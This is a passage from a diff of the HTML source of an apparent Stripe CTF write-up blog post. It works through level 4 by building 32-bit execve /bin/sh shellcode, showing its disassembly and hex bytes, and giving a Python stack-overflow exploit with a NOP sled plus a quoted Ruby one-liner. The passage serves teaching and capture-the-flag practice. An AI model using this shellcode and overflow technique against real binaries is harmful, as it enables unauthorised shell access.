 &lt;p&gt;After that, &lt;strong&gt;NULL&lt;/strong&gt; is pushed in:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004f0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;:&lt;/span&gt;   &lt;span class="n"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;edx&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00000000004004f0 &amp;lt;+32&amp;gt;:   mov    $0x0,%edx
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Finally, &lt;strong&gt;execve&lt;/strong&gt; is executed:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mh"&gt;0x00000000004004fb&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;+&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="nx"&gt;callq&lt;/span&gt;  &lt;span class="mh"&gt;0x40c540&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00000000004004fb &amp;lt;+43&amp;gt;:   callq  0x40c540 &amp;lt;execve&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;Writing the Shellcode in Assembly&lt;/h3&gt;
 &lt;p&gt;Now we are able to reproduce the code in Assembly. This is important: Stripe's machine were 32-bit, and the Assembly instructions are different from 64-bit (for instance,  check the 64-bit shellcode I showed &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;here&lt;/a&gt;).&lt;/p&gt;
 &lt;p&gt;With an &lt;strong&gt;l&lt;/strong&gt; added to the words, the above shellcode in 32-bit machines is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="na"&gt;.text&lt;/span&gt;
 &lt;span class="na"&gt;.globl&lt;/span&gt; &lt;span class="no"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -334,13 +335,13 @@ chmod +x date
   &lt;span class="nf"&gt;movl&lt;/span&gt;  &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;    &lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="no"&gt;wrutes&lt;/span&gt; &lt;span class="no"&gt;array&lt;/span&gt; &lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;
   &lt;span class="nf"&gt;xorl&lt;/span&gt;  &lt;span class="nv"&gt;%edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%edx&lt;/span&gt;    &lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="no"&gt;xor&lt;/span&gt; &lt;span class="no"&gt;to&lt;/span&gt; &lt;span class="no"&gt;make&lt;/span&gt; &lt;span class="no"&gt;edx&lt;/span&gt; &lt;span class="no"&gt;equal&lt;/span&gt; &lt;span class="no"&gt;to&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;
   &lt;span class="nf"&gt;movb&lt;/span&gt;  &lt;span class="no"&gt;$0xb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%al&lt;/span&gt;     &lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="no"&gt;execve&lt;/span&gt; &lt;span class="no"&gt;system&lt;/span&gt; &lt;span class="no"&gt;call&lt;/span&gt; &lt;span class="c"&gt;#11  */&lt;/span&gt;
-  &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="no"&gt;$0x80&lt;/span&gt;           &lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="no"&gt;make&lt;/span&gt; &lt;span class="no"&gt;an&lt;/span&gt; &lt;span class="no"&gt;interrupt&lt;/span&gt; &lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;
+  &lt;span class="no"&gt;int&lt;/span&gt; &lt;span class="no"&gt;$0x80&lt;/span&gt;           &lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt; &lt;span class="no"&gt;make&lt;/span&gt; &lt;span class="no"&gt;an&lt;/span&gt; &lt;span class="no"&gt;interrupt&lt;/span&gt; &lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To assemble and link this in a 32-bit machine we do:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt;  &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;   &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
-&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ld&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ as  -o shell.o   shell.s
+$ ld -m -o shell shell.o
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -351,75 +352,75 @@ chmod +x date
 &lt;li&gt;Link with the &lt;strong&gt;-m elf_i386&lt;/strong&gt; flag.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Resulting in:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;   &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
-&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ld&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="n"&gt;elf_i386&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ as --32 -o shell.o   shell.s
+$ ld -m elf_i386 -o shell shell.o
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, the last step is to get the executable &lt;strong&gt;shell&lt;/strong&gt; in hexadecimal so we have the instructions for the shellcode. We use &lt;strong&gt;objdump&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="nx"&gt;objdump&lt;/span&gt; &lt;span class="na"&gt;-d&lt;/span&gt; &lt;span class="nx"&gt;shell&lt;/span&gt;
-&lt;span class="nx"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;     &lt;span class="nb"&gt;file&lt;/span&gt; &lt;span class="nb"&gt;format&lt;/span&gt; &lt;span class="nx"&gt;elf32&lt;/span&gt;&lt;span class="na"&gt;-i386&lt;/span&gt;
-&lt;span class="nx"&gt;Disassembly&lt;/span&gt; &lt;span class="nx"&gt;of&lt;/span&gt; &lt;span class="nx"&gt;section&lt;/span&gt; &lt;span class="bp"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-&lt;span class="mi"&gt;08048054&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;_start&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
- &lt;span class="mi"&gt;8048054&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="nx"&gt;c0&lt;/span&gt;                   &lt;span class="nx"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
- &lt;span class="mi"&gt;8048056&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;50&lt;/span&gt;                      &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
- &lt;span class="mi"&gt;8048057&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;73&lt;/span&gt; &lt;span class="mi"&gt;68&lt;/span&gt;          &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;
- &lt;span class="mi"&gt;804805&lt;/span&gt;&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="nb"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;62&lt;/span&gt; &lt;span class="mi"&gt;69&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;          &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;
- &lt;span class="mi"&gt;8048061&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="nx"&gt;e3&lt;/span&gt;                   &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt;
- &lt;span class="mi"&gt;8048063&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;50&lt;/span&gt;                      &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt;
- &lt;span class="mi"&gt;8048064&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;53&lt;/span&gt;                      &lt;span class="nb"&gt;push&lt;/span&gt;   &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt;
- &lt;span class="mi"&gt;8048065&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;89&lt;/span&gt; &lt;span class="nx"&gt;e1&lt;/span&gt;                   &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;ecx&lt;/span&gt;
- &lt;span class="mi"&gt;8048067&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="mi"&gt;31&lt;/span&gt; &lt;span class="nx"&gt;d2&lt;/span&gt;                   &lt;span class="nx"&gt;xor&lt;/span&gt;    &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt;
- &lt;span class="mi"&gt;8048069&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="nx"&gt;b0&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;                   &lt;span class="nx"&gt;mov&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0xb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nx"&gt;al&lt;/span&gt;
- &lt;span class="mi"&gt;804806&lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;   &lt;span class="nx"&gt;cd&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;                   &lt;span class="nx"&gt;int&lt;/span&gt;    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ objdump -d shell
+shell:     file format elf32-i386
+Disassembly of section .text:
+&lt;span class="m"&gt;08048054&lt;/span&gt; &amp;lt;_start&amp;gt;:
+ &lt;span class="m"&gt;8048054&lt;/span&gt;:   &lt;span class="m"&gt;31&lt;/span&gt; c0                   xor    %eax,%eax
+ &lt;span class="m"&gt;8048056&lt;/span&gt;:   &lt;span class="m"&gt;50&lt;/span&gt;                      push   %eax
+ &lt;span class="m"&gt;8048057&lt;/span&gt;:   &lt;span class="m"&gt;68&lt;/span&gt; 2f 2f &lt;span class="m"&gt;73&lt;/span&gt; &lt;span class="m"&gt;68&lt;/span&gt;          push   &lt;span class="nv"&gt;$0&lt;/span&gt;x68732f2f
+ 804805c:   &lt;span class="m"&gt;68&lt;/span&gt; 2f &lt;span class="m"&gt;62&lt;/span&gt; &lt;span class="m"&gt;69&lt;/span&gt; 6e          push   &lt;span class="nv"&gt;$0&lt;/span&gt;x6e69622f
+ &lt;span class="m"&gt;8048061&lt;/span&gt;:   &lt;span class="m"&gt;89&lt;/span&gt; e3                   mov    %esp,%ebx
+ &lt;span class="m"&gt;8048063&lt;/span&gt;:   &lt;span class="m"&gt;50&lt;/span&gt;                      push   %eax
+ &lt;span class="m"&gt;8048064&lt;/span&gt;:   &lt;span class="m"&gt;53&lt;/span&gt;                      push   %ebx
+ &lt;span class="m"&gt;8048065&lt;/span&gt;:   &lt;span class="m"&gt;89&lt;/span&gt; e1                   mov    %esp,%ecx
+ &lt;span class="m"&gt;8048067&lt;/span&gt;:   &lt;span class="m"&gt;31&lt;/span&gt; d2                   xor    %edx,%edx
+ &lt;span class="m"&gt;8048069&lt;/span&gt;:   b0 0b                   mov    &lt;span class="nv"&gt;$0&lt;/span&gt;xb,%al
+ 804806b:   &lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="m"&gt;80&lt;/span&gt;                   int    &lt;span class="nv"&gt;$0&lt;/span&gt;x80
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Which in the little-endian representation is:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x31&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xc0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x73&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x62&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x69&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x6e&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe3&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x53&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe1&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x31&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xd2&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xb0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x0b&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xcd&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x80&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;Solving the Problem&lt;/h3&gt;
 &lt;p&gt;Now, all we need to do is write a snippet in any language which takes that shellcode and some NOPs to overflow the stack of the &lt;em&gt;level04&lt;/em&gt;'s' binary. We write the exploit in Python:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
 
 &lt;span class="n"&gt;STACK&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x0804857b&lt;/span&gt;
 &lt;span class="n"&gt;NOP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; \&lt;span class="n"&gt;x90&lt;/span&gt;
-&lt;span class="n"&gt;SHELLCODE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;SHELLCODE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
 &lt;span class="n"&gt;EXPLOIT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NOP&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SHELLCODE&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SHELLCODE&lt;/span&gt;
 
-&lt;span class="n"&gt;stack_ptr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;STACK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;
-&lt;span class="n"&gt;array&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXPLOIT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stack_ptr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;stack_ptr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;I&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;STACK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;
+&lt;span class="n"&gt;array&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXPLOIT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stack_ptr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
 &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
-  &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/levels/level04&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+  &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/levels/level04&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This solution is possible due to  the &lt;a href="https://docs.python.org/2/library/struct.html"&gt;struct&lt;/a&gt; module, which performs conversion between Python and C values, and the &lt;a href="https://docs.python.org/2/library/subprocess.html"&gt;subprocess&lt;/a&gt; module, which allows us to spawn new processes. The &lt;strong&gt;struct.pack&lt;/strong&gt; method returns a string containing the values packet in the specified format (where &lt;strong&gt;&amp;lt;&lt;/strong&gt; means little-endian and &lt;strong&gt;I&lt;/strong&gt; is unsigned int).&lt;/p&gt;
 &lt;p&gt;A &lt;a href="https://github.com/stripe-ctf"&gt;one-line solution in Ruby&lt;/a&gt;, was given by Stripe and it's worth to mention:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ruby&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;987&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x7b\x85\x04\x08&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ruby -e &lt;span class="s1"&gt;&amp;#39;print &amp;quot;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42&amp;quot; + &amp;quot;\x90&amp;quot;*987 + &amp;quot;\x7b\x85\x04\x08&amp;quot;&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
+&lt;hr&gt;
 &lt;h2&gt;Level 5:  Unpickle exploit&lt;/h2&gt;
 &lt;p&gt;The fifth level is an uppercasing &lt;strong&gt;web service&lt;/strong&gt; written in Python, which is split into an HTTP part, and a worker queue part.&lt;/p&gt;
 &lt;p&gt;In this service, a request can be sent  with:&lt;/p&gt;
